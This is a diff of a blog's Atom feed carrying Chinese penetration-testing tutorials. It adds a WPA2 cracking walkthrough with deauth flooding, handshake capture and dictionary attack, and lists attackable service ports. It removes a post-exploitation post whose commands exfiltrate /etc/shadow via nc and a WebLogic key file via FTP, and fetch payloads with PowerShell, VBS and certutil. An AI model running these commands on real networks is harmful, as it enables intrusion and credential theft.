@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2018-12-11T10:28:42.549Z</updated>
+  <updated>2018-12-12T12:15:27.593Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -15,6 +15,30 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>利用airodump-ng和aircrack-ng进行无线破解</title>
+    <link href="http://yoursite.com/2018/12/12/%E5%88%A9%E7%94%A8airodump-ng%E5%92%8Caircrack-ng%E8%BF%9B%E8%A1%8C%E6%97%A0%E7%BA%BF%E7%A0%B4%E8%A7%A3/"/>
+    <id>http://yoursite.com/2018/12/12/利用airodump-ng和aircrack-ng进行无线破解/</id>
+    <published>2018-12-12T09:12:56.000Z</published>
+    <updated>2018-12-12T12:15:27.593Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="WEP（有线等效保密）认证过程："><a href="#WEP（有线等效保密）认证过程：" class="headerlink" title="WEP（有线等效保密）认证过程："></a>WEP（有线等效保密）认证过程：</h1><ul><li>客户端向接入点发送认证请求</li><li>接入点发回一段明文</li><li>客户端利用事先共享的密钥加密这段明文（对称），并再次发出认证请求</li><li>接入点对数据包进行解密，比较明文，来决定是否接受请求</li></ul><h1 id="WEP2（wifi网络安全接入）安全性："><a href="#WEP2（wifi网络安全接入）安全性：" class="headerlink" title="WEP2（wifi网络安全接入）安全性："></a>WEP2（wifi网络安全接入）安全性：</h1><ul><li>WPA2在密钥足够强的情况下是安全的，过短的密钥仍可能被爆破解出</li><li>WPA2-PSK指的是WPA2个人版，指的是使用事先约定的密钥进行认证的WPA2</li></ul><h1 id="Aircrack-ng抓包及破解WPA2"><a href="#Aircrack-ng抓包及破解WPA2" class="headerlink" title="Aircrack-ng抓包及破解WPA2"></a>Aircrack-ng抓包及破解WPA2</h1><ul><li>虚拟机安装无线网卡</li><li>配置无线网卡</li><li>利用airodump-ng进行抓包</li><li>利用crunch生成字典</li><li>利用aircrack-ng进行爆破</li></ul><p><strong>Aircrack</strong>是破解<code>WEP/WPA/WPA2</code>加密的主流工具之一。<strong>Aircrack-ng</strong>套件包含的工具可用于捕获数据包、握手验证。可用来进行暴力破解和字典攻击。</p><p><strong>Aircrack-ng</strong> 攻击 主要是拿到握手包，用字典破解握手包。</p><p>首先，你得有个无线网卡，然后去自动配置他，操作嘛当然都是在kali虚拟机下进行的。</p><h2 id="准备阶段"><a href="#准备阶段" class="headerlink" title="准备阶段"></a>准备阶段</h2><pre><code>airmon-ng check kill</code></pre><p>kill掉影响网卡的进程，一般情况下，每次重启或者开机后这些进程都会自己开始。</p><p><img src="https://img-blog.csdnimg.cn/20181109163042314.png" alt=""></p><p>将无线网卡模式改为<strong>monitor</strong>模式</p><pre><code>iwconfig wlan0mon mode monitor </code></pre><p><img src="https://img-blog.csdnimg.cn/20181109164030848.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2pweWd4MTIz,size_16,color_FFFFFF,t_70" alt=""></p><p>打开网卡：</p><pre><code>airmon-ng start wlan0</code></pre><p><img src="https://img-blog.csdnimg.cn/20181109164205722.png" alt=""></p><p>这时候网卡名为wlan0mon。（mon是monitor的缩写，意思为监控）</p><h2 id="wifi嗅探"><a href="#wifi嗅探" class="headerlink" title="wifi嗅探"></a>wifi嗅探</h2><p>查看当前区域的所有wifi</p><pre><code>airodump-ng wlan0mon</code></pre><p><img src="https://img-blog.csdnimg.cn/2018110916441831.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2pweWd4MTIz,size_16,color_FFFFFF,t_70" alt=""></p><ul><li>BSSID：wifi路由的 Mac地址， </li><li>Data 当前wifi数据大小，有数据就表明有人正在使用，你就可以把它作为一个选择了。</li><li>CH ：渠道，后面的攻击要用到。 </li><li>ESSID： wifi的 名字。还有，他的排序是按信号的强弱来排序的，越往上信号越强。PWR 是强度，不用记，慢慢的就知道了。</li></ul><p>经过观察之后选择一个你想破解或者攻击的wifi，前提是它得有数据显示，Date的那列，所以选择攻击的wifi最好先从Date看起来，选择一个有数据的wifi之后按Ctrl+c 停止检测，复制你选择的Mac地址。</p><h2 id="下一步"><a href="#下一步" class="headerlink" title="下一步"></a>下一步</h2><pre><code>airodump-ng --bssid 0C:4B:54:AE:C1:06 -c 11 -w ~/wlan0/qihua wlan0mon</code></pre><blockquote><p>-c 是 渠道  bssid 是路由的Mac地址 -w是放包的目录</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20181109172131528.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2pweWd4MTIz,size_16,color_FFFFFF,t_70" alt=""></p><p>可以看到有三个连接。</p><h2 id="洪水攻击（重复不断的攻击）"><a href="#洪水攻击（重复不断的攻击）" class="headerlink" title="洪水攻击（重复不断的攻击）"></a>洪水攻击（重复不断的攻击）</h2><pre><code>aireplay-ng -0 0 -a 0C:4B:54:AE:C1:06 -c CC:2F:71:8C:FA:4B wlan0mon</code></pre><p><strong>-0</strong>表示一直不断的攻击，类似于拒绝服务攻击，占满你的握手请求通道，其他的连接进不来，也可以让当前所有连接断开，-c在这里表示的是client的mac地址。</p><p>攻击的时候不要关闭抓包窗口，注意观察抓包窗口。</p><p><img src="https://img-blog.csdnimg.cn/20181109172327525.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2pweWd4MTIz,size_16,color_FFFFFF,t_70" alt=""></p><p>过一会停掉洪水攻击，静等别人连接，出现<code>WPA handshake :</code>  ，就表示成功。如果有连接很快就可以抓到包</p><p><img src="https://img-blog.csdnimg.cn/20181109172929110.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2pweWd4MTIz,size_16,color_FFFFFF,t_70" alt=""></p><h2 id="抓包信息及爆破"><a href="#抓包信息及爆破" class="headerlink" title="抓包信息及爆破"></a>抓包信息及爆破</h2><p><img src="https://img-blog.csdnimg.cn/20181109173157234.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2pweWd4MTIz,size_16,color_FFFFFF,t_70" alt=""></p><p>抓到握手包那么就可以用密码字典进行爆破了，爆破的是.cap文件。</p><pre><code>aircrack-ng -w password.txt wlan0/qihua-01.cap</code></pre><p>接下来就静静等待跑包。</p><p><img src="https://img-blog.csdnimg.cn/20181109200738468.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2pweWd4MTIz,size_16,color_FFFFFF,t_70" alt=""></p><p>完成！密码51201314</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h1 id=&quot;WEP（有线等效保密）认证过程：&quot;&gt;&lt;a href=&quot;#WEP（有线等效保密）认证过程：&quot; class=&quot;headerlink&quot; title=&quot;WEP（有线等效保密）认证过程：&quot;&gt;&lt;/a&gt;WEP（有线等效保密）认证过程：&lt;/h1&gt;&lt;ul&gt;
+&lt;li&gt;客户端向接入点发
+      
+    
+    </summary>
+    
+      <category term="无线安全" scheme="http://yoursite.com/categories/%E6%97%A0%E7%BA%BF%E5%AE%89%E5%85%A8/"/>
+    
+    
+  </entry>
   
   <entry>
     <title>GeoIP</title>
@@ -271,7 +295,7 @@ whoami /priv 查看当前用户的权限
     <link href="http://yoursite.com/2018/12/04/%E5%B8%B8%E8%A7%81%E7%9A%84%E6%BC%8F%E6%B4%9E%E7%AB%AF%E5%8F%A3/"/>
     <id>http://yoursite.com/2018/12/04/常见的漏洞端口/</id>
     <published>2018-12-04T07:48:29.000Z</published>
-    <updated>2018-12-04T07:56:29.494Z</updated>
+    <updated>2018-12-12T09:15:44.733Z</updated>
     
     <content type="html"><![CDATA[<p><strong>21</strong> ftp 主要看是否支持匿名，也可以跑弱口令</p><p><strong>22</strong> ssh SSH远程登录协议</p><p><strong>23</strong> telnet telnet终端仿真协议</p><p><strong>80</strong> web 常见web漏洞以及是否为一些管理后台</p><p><strong>389</strong> LDAP（轻量目录访问协议）存在匿名访问</p><p><strong>443</strong> openssl 心脏滴血以及一些web漏洞测试</p><p><strong>873</strong> rsync 主要看是否支持匿名，也可以跑弱口令</p><p><strong>1099</strong>  JAVArmi  命令执行</p><p><strong>1433</strong> SQl server</p><p><strong>1521</strong>  Oracle   弱口令</p><p><strong>3306</strong> MySQL 能够外联数据库</p><p><strong>3389</strong> RDP 远程桌面看看能不能弱口令</p><p><strong>5432</strong>        PostGreSQL       弱口令爆破</p><p><strong>6379</strong> redis 一般无认证，可直接访问</p><p><strong>7001，7002</strong>  weblogic的console口</p><p><strong>8080</strong>  Tomcat\Jboss     弱口令，Jboss匿名访问</p><p><strong>8080-8090</strong>   常见Web端口</p><p><strong>9000</strong> fast-cgi对外可以getshell</p><p><strong>9043</strong>        WebSphere        弱口令爆破</p><p><strong>27017</strong>    MongoDB          未授权访问</p>]]></content>
     
@@ -286,6 +310,8 @@ whoami /priv 查看当前用户的权限
       
     
     </summary>
+    
+      <category term="信息收集" scheme="http://yoursite.com/categories/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
     
     
   </entry>
@@ -491,29 +517,6 @@ from selenium import we
     </summary>
     
       <category term="python脚本" scheme="http://yoursite.com/categories/python%E8%84%9A%E6%9C%AC/"/>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>内网文件传输</title>
-    <link href="http://yoursite.com/2018/12/03/%E5%86%85%E7%BD%91%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93/"/>
-    <id>http://yoursite.com/2018/12/03/内网文件传输/</id>
-    <published>2018-12-03T06:57:38.000Z</published>
-    <updated>2018-12-03T11:55:45.471Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="文件传输方法："><a href="#文件传输方法：" class="headerlink" title="文件传输方法："></a>文件传输方法：</h1><h2 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h2><h3 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h3><p>ftp -s:1.txt【-s将后面跟的1.txt内容全部当做命令行执行】（FTP传文件比较万能，任意类型文件都可上传）</p><h4 id="实践："><a href="#实践：" class="headerlink" title="实践："></a>实践：</h4><p>现有公网IP: 101.198.183.60，内网IP: 192.168.0.84的开发webloginc 7001端口并且有反序列化漏洞的主机一台，以及</p><p>公网IP: 101.198.183.68，内网IP: 192.168.0.98开放ftp服务的主机一台。</p><p>实施攻击的是不同网段的win7攻击机（可以访问公网，但是内网不可访问）。</p><p>开启FTP服务：<br><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxtss5qpy1j30c208tdg0.jpg" alt=""></p><p>使用win7攻击机上的WebLogicExploit工具远程连接weblogic主机</p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxtst1385ij30in0c474q.jpg" alt=""></p><pre><code>1、echo open 192.168.0.98 2121 &gt;&gt; 1.txt         //登陆FTP服务器2、echo guoxiang&gt;&gt;1.txt                              //用户名3、echo password&gt;&gt;1.txt                              //密码4、echo bin&gt;&gt;1.txt                              //开始5、echo put C:\Oracle\Middleware\user_projects\domains\college\security\SerializedSystemIni.dat&gt;&gt; 1.txt                      //下载程序6、echo bye&gt;&gt;1.txt                              //关闭FTP服务器</code></pre><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxtstvlpcgj30hi08owex.jpg" alt=""></p><p>然后执行ftp -s:1.txt</p><p>发现在ftp主机中出现了上传的文件。</p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxtsufxctmj30jw0800tc.jpg" alt=""></p><p>用同一内网下含有反序列化任意命令执行漏洞的weblogic主机做跳板，用weblogic主机去攻击同一内网下的ftp主机。</p><h3 id="VBS"><a href="#VBS" class="headerlink" title="VBS"></a>VBS</h3><p>echo 下载文件程序&gt;&gt;loader.vbs cscript loader.vbs远程文件位置保存文件位置</p><pre><code>echo set a=createobject(^&quot;adod^&quot;+^&quot;b.stream^&quot;):set w=createobject(^&quot;micro^&quot;+^&quot;soft.xmlhttp^&quot;):w.open ^&quot;get^&quot;,wsh.arguments( 0),0:w.send:a.type=1:a.open:a.write w.responsebody:a.savetofile wsh.arguments(1),2 &gt;&gt; loader.vbscscript loader.vbs http://192.168.0.98:7001/test/putty.exe C:\Users\linghuchong\Desktop\Tools\putty.exeputty.exe</code></pre><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxtsvspt2zj30np0czdhb.jpg" alt=""></p><h3 id="Powershell"><a href="#Powershell" class="headerlink" title="Powershell"></a>Powershell</h3><p><code>powershell-exec bypass-c（new-object System.Net.WebClient）.DownloadFile（“远程文件位置“保存文件位置）</code></p><pre><code> powershell -exec bypass -c (new-object System.Net.WebClient).DownloadFile(&apos;http://192.168.111.1:8080/test/putty.exe&apos;,&apos;C:\Users\linghuchong\Desktop\Tools\putty1.exe&apos;)putty1.exe</code></pre><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxtsxb16y4j30ko0cywfm.jpg" alt=""></p><h3 id="certain"><a href="#certain" class="headerlink" title="certain"></a>certain</h3><p><code>certutil.exe -urlcache -split -f 远程文件位置</code></p><pre><code>certutil.exe -urlcache -split -f http://192.168.111.1:8080/test/putty.execertutil.exe -urlcache -split -f http://192.168.111.1:8080/test/putty.exe delete        //删除缓存putty.exe</code></pre><h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><p>攻击端监听端口，并重定向：</p><pre><code>nc -nvv -lp 4455 &gt; shaodw.txt</code></pre><p>目标机将文件内容回传：</p><pre><code>nc 192.168.111.251 4455 &lt; /etc/shadow</code></pre><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxtsylae6dj30qc0egwfl.jpg" alt=""></p><h3 id="Wget（下载）"><a href="#Wget（下载）" class="headerlink" title="Wget（下载）"></a>Wget（下载）</h3><pre><code>wget http://192.168.111.1:8080/test/putty.exe</code></pre><h3 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h3><p>支持文件的上传和下载，是综合传输工具，但按传统，习惯称url为下载工具。</p><pre><code>curl -O http://192.168.111.1:8080/test/putty.exe</code></pre>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h1 id=&quot;文件传输方法：&quot;&gt;&lt;a href=&quot;#文件传输方法：&quot; class=&quot;headerlink&quot; title=&quot;文件传输方法：&quot;&gt;&lt;/a&gt;文件传输方法：&lt;/h1&gt;&lt;h2 id=&quot;windows&quot;&gt;&lt;a href=&quot;#windows&quot; class=&quot;headerlink
-      
-    
-    </summary>
-    
-      <category term="内网渗透" scheme="http://yoursite.com/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
     
     
   </entry>
